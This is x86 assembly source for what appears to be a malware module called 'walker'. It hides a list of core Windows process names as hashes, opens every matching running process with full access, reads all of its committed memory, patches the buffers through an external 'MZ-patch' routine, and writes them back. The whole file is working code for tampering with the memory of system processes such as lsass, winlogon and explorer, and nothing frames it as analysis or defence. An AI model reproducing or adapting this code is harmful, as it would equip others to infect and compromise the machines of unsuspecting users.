
include                 WALKER.INC
include                 ..\..\INCLUDE\consts.inc
include                 ..\MAIN\MAIN.INC

                        extern  Event:PROC
                        public  HandleEvent

                        public  walker_main

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

walker_complete         db      0

ddhash                  macro   procname
                        hash = 0
                        irpc    c, <procname>
                          hash = ((hash shl 7) and 0FFFFFFFFh) or (hash shr (32-7))
                          if "&c" eq "|"
                            hash = hash xor 20h
                          else
                            hash = hash xor ("&c" or 20h)
                          endif
                        endm
                        dd      hash
                        endm

known_names:            ;;
                        ddhash  kernel32.dll
                        ddhash  msgsrv32.exe
                        ddhash  mprexe.exe
                        ddhash  mmtask.tsk
                        ddhash  mstask.exe
                        ddhash  explorer.exe
                        ddhash  internat.exe
                        ddhash  taskmon.exe
                        ddhash  systray.exe
                        ddhash  rundll.exe
                        ddhash  wmiexe.exe
                        ddhash  winoa386.mod
                        ;;
                        ddhash  system
                        ddhash  [system|process]
                        ddhash  [system|idle|process]
                        ddhash  smss.exe
                        ddhash  os2ss.exe
                        ddhash  os2srv.exe
                        ddhash  csrss.exe
                        ddhash  winlogon.exe
                        ddhash  services.exe
                        ddhash  lsass.exe
                        ddhash  svchost.exe
                        ddhash  spoolsv.exe
                        ddhash  regsvc.exe
                        ddhash  ntvdm.exe
                        ddhash  cmd.exe
                        ddhash  taskmgr.exe
                        ;;
                        ddhash  nddeagnt.exe
                        ddhash  spoolss.exe
                        ddhash  rpcss.exe
                        ddhash  tapisrv.exe
                        ddhash  rasman.exe
                        ;;
known_names_num         equ     $-known_names

                        .code

HandleEvent:
                        mov     eax, [esp+4]    ; event_id

                        cmp     eax, EV_MAIN_IDLE
                        je      __walker

__return_0:             xor     eax, eax
                        retn

__walker:               cmp     walker_complete, 0
                        jne     __return_0
                        inc     walker_complete

                        push    offset my_callback2
                        push    offset my_callback1
                        call    walker_main
                        add     esp, 8

                        or      eax, eax
                        jz      __noresult

                        push    0
                        push    EV_WALKER_PATCHED
                        call    Event
                        add     esp, 8
__noresult:

                        mov     eax, 1
                        retn

my_callback1:
                        mov     ecx, [esp+4]
__temp2:                mov     edx, ecx
__temp1:                mov     al, [ecx]
                        inc     ecx
                        cmp     al, '\'
                        je      __temp2
                        or      al, al
                        jnz     __temp1

                        xor     eax, eax        ; calculate hash
__calc_hash:            rol     eax, 7
                        mov     cl, [edx]
                        or      cl, 20h
                        xor     al, cl
                        inc     edx
                        cmp     byte ptr [edx], 0
                        jne     __calc_hash

                        lea     edi, known_names
                        mov     ecx, known_names_num
                        repnz   scasd

                        setnz   al
                        movzx   eax, al

                        retn

my_callback2:
                        push    1                       ; use MZ-patch
                        push    dword ptr [esp+8]+4     ; size
                        push    dword ptr [esp+4]+8     ; buf
                        callW   patch_buf
                        add     esp, 12
                        retn

; returns: EAX=# bytes patched

walker_main             proc    c
                        arg     callback1
                        arg     callback2
                        local   memptr:DWORD
                        local   snaphandle:DWORD
                        local   result:DWORD
                        local   high_addr
                        local   th_pe:BYTE:size th_pe_struc
                        local   mbi:BYTE:size mbi_struc
                        pusha
                        cld

                        mov     result, 0

                        callW   GetVersion
                        shl     eax, 1
                        mov     eax, 77000000h  ; winNT
                        jnc     __cont1
                        mov     eax, 80000000h  ; win9X
__cont1:
                        mov     high_addr, eax

                        push    WALKER_SIZE
                        callW   malloc
                        mov     memptr, eax     ; fixed

                        push    0
                        push    2               ; TH32CS_SNAPPROCESS
                        callW   CreateToolhelp32Snapshot
                        cmp     eax, -1
                        je      __exit
                        mov     snaphandle, eax

                        mov     th_pe.th_pe_dwSize, size th_pe_struc

                        lea     eax, th_pe
                        push    eax
                        push    snaphandle
                        callW   Process32First
__processcycle:         or      eax, eax
                        jz      __processdone

                        callW   GetCurrentProcessId
                        cmp     eax, th_pe.th_pe_th32ProcessID
                        je      __nextprocess

                        lea     ecx, th_pe.th_pe_szExeFile
                        push    ecx
                        call    callback1
                        add     esp,4

                        or      eax, eax
                        jz      __nextprocess

                        push    th_pe.th_pe_th32ProcessID ; process id
                        push    0
                        push    001F0FFFh       ; PROCESS_ALL_ACCESS
                        callW   OpenProcess
                        or      eax, eax
                        jz      __nextprocess
                        xchg    ebx, eax        ; process handle

;                       pusha
;                       lea     edx, th_pe.th_pe_szExeFile
;                       call    dump_asciiz_edx
;                       call    dump_crlf
;                       popa

;----------------------------------------------------------------------------
                        mov     esi, 00400000h  ; start address

__querycycle:           lea     eax, mbi
                        push    size mbi_struc
                        push    eax
                        push    esi             ; address
                        push    ebx             ; process handle
                        callW   VirtualQueryEx
                        cmp     eax, size mbi_struc
                        jne     __querydone

                        mov     eax, mbi.mbi_State
                        cmp     eax, 1000h      ; MEM_COMMIT
                        jne     __nextregion

                        mov     ecx, mbi.mbi_RegionSize
                        mov     edi, memptr
                        call    walker_fuxor

__nextregion:           add     esi, mbi.mbi_RegionSize
                        cmp     esi, high_addr
                        jb      __querycycle
__querydone:
;----------------------------------------------------------------------------

                        push    ebx             ; process handle
                        callW   mfree

__nextprocess:          lea     eax, th_pe
                        push    eax
                        push    snaphandle
                        callW   Process32Next
                        jmp     __processcycle

__processdone:          push    snaphandle
                        callW   CloseHandle

__exit:                 push    memptr
                        callW   GlobalFree

                        mov     eax, result
                        mov     [esp].popa_eax, eax

                        popa
                        ret
                        endp

; action: split big block (size in ECX) into small blocks (calls)
; input: EBX=process handle
;        ESI=memory block address
;        ECX=memory block size
;        EDI=temp block

walker_fuxor:           pusha

                        mov     eax, ecx

__cycle:                mov     ecx, WALKER_SIZE
                        cmp     ecx, eax
                        jbe     __be
                        mov     ecx, eax
__be:
                        call    walker_fuxor_real

                        add     esi, ecx
                        sub     eax, ecx
                        jnz     __cycle

                        popa
                        retn

; input: EBX=process handle
;        ESI=memory block address
;        ECX=memory block size
;        EDI=temp block

walker_fuxor_real:      pusha

                        call    mem_read
                        jc      __exit

                        push    ecx     ; size
                        push    edi     ; buf
                        call    callback2
                        add     esp, 8

                        or      eax, eax        ; no bytes changed?
                        jz      __exit

                        add     result, eax

                        call    mem_write       ; update patched buffer

__exit:                 popa
                        retn

mem_read:               pusha

                        push    0
                        push    esp             ; @bytesread
                        push    ecx             ; bytes to read
                        push    edi             ; write to
                        push    esi             ; address (read from)
                        push    ebx             ; process handle
                        callW   ReadProcessMemory
                        pop     ecx

                        or      eax, eax
                        stc
                        jz      __exit
                        cmp     ecx, [esp+6*4]  ; pusha.ecx
                        stc
                        jne     __exit
                        clc
__exit:                 popa
                        retn

mem_write:              pusha
                        push    0               ; @byteswritten
                        push    ecx             ; bytes to write
                        push    edi             ; read from
                        push    esi             ; address (write to)
                        push    ebx             ; process handle
                        callW   WriteProcessMemory
                        popa
                        retn

;include                ..\..\INCLUDE\console.inc

                        end
